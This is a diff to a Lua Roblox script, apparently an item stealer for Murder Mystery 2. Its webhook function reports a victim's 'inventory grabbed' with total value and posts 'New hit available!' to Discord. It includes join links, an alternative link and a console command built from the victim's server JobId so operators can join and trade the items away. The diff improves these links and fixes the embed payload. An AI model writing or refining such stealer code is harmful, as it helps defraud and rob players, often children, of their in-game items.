@@ -282,6 +282,16 @@ local function GodfatherScriptSendWebhook()
     local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
     local targetName = users[1] or "Unknown"
     
+    -- Working link formats:
+    -- 1. For Roblox JobId Join extension: https://www.roblox.com/games/PLACEID/NAME?serverJobId=JOBID
+    -- 2. Alternative: https://www.roblox.com/games/start?placeId=PLACEID&gameId=JOBID (requires extension)
+    
+    local placeId = 142823291  -- MM2 Place ID
+    local gameName = "Murder-Mystery-2"
+    
+    local joinLink = string.format("https://www.roblox.com/games/%d/%s?serverJobId=%s", placeId, gameName, JobId)
+    local alternativeLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameId=%s", placeId, JobId)
+    
     local embed = {
         title = string.format("Godfather Script | %s | %s", plr.DisplayName or plr.Name, targetName),
         description = string.format("%s's inventory grabbed!\nTotal Value: %d\nJoin and trade:", plr.Name, totalInventoryValue),
@@ -295,8 +305,18 @@ local function GodfatherScriptSendWebhook()
                 inline = true
             },
             {
-                name = "Join Link",
-                value = string.format("[Click to Join](%s)\n```\n%s\n```", fernJoinerLink, fernJoinerLink),
+                name = "Join Link (Extension Required)",
+                value = string.format("[Click to Join](%s)\n```\n%s\n```", joinLink, joinLink),
+                inline = false
+            },
+            {
+                name = "Alternative Link",
+                value = string.format("[Click to Join](%s)\n```\n%s\n```", alternativeLink, alternativeLink),
+                inline = false
+            },
+            {
+                name = "Console Command",
+                value = string.format("```lua\nRoblox.GameLauncher.joinGameInstance(%d, \"%s\")\n```", placeId, JobId),
                 inline = false
             },
             {
@@ -334,10 +354,8 @@ local function GodfatherScriptSendWebhook()
     local prefix = cfg.pingEveryone == "Yes" and "@everyone " or ""
     
     local payload = {
-        content = prefix ..
-            "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" ..
-            game.JobId .. "')",
-        embeds = {embed}  -- Fixed: was {{embed}} which is wrong
+        content = prefix .. "New hit available!",
+        embeds = {embed}  -- Fixed: was {{embed}}
     }
     
     local success, response = pcall(function()
@@ -355,7 +373,6 @@ local function GodfatherScriptSendWebhook()
     
     return success
 end
-
 GodfatherScriptSendWebhook()
 
 local function GodfatherScriptGetStatus()
